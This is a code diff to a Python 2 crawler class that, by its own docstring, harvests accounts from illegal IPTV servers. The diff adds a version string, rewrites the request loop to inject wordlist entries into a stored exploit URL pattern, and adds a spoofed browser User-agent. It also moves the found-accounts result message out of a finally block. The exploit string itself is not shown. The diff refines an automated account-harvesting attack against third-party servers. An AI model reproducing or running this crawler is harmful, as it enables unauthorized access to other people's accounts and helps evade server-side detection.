@@ -12,8 +12,11 @@ Class that handles the crawling process that fetch accounts on illegal IPTVs
 Authors:
 Claudio Ludovico (@Ludo237)
 Pinperepette (@Pinperepette)
+Arm4x (@Arm4x)
 """
 class Crawler(object):
+    # version
+    version = "1.2.3"
     # output default directory
     outputDir = "output"
     # language default directory
@@ -86,8 +89,9 @@ class Crawler(object):
                 rows = f.readlines()
             for row in rows:
                 # Do the injection to the current url using the exploit that we know
-                request = urllib2.Request(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
-                response = urllib2.urlopen(request)
+                opener = urllib2.build_opener()
+                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+                response = opener.open(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
                 fetched = response.read()
                 # Update the progress bar in order to give to the user a nice
                 # way to indicate the time left
@@ -100,6 +104,10 @@ class Crawler(object):
                     self.create_file(row, newPath, fetched)
             # Remove the current used url in order to avoid to parse it again
             self.parsedUrls.remove(url)
+            if self.foundedAccounts != 0:
+                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
+            else:
+                return "No results for " + url
         except IOError:
             return "Cannot open the current Language file. Try another one"
         except urllib2.HTTPError, e:
@@ -108,11 +116,6 @@ class Crawler(object):
             return "Ops, the URL seems broken." + str(e.reason)
         except Exception:
             return "Ops something went wrong!"
-        finally:
-            if self.foundedAccounts != 0:
-                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
-            else:
-                return "No results for " + url
 
     def create_file(self, row, newPath, fetched):
         """Create File
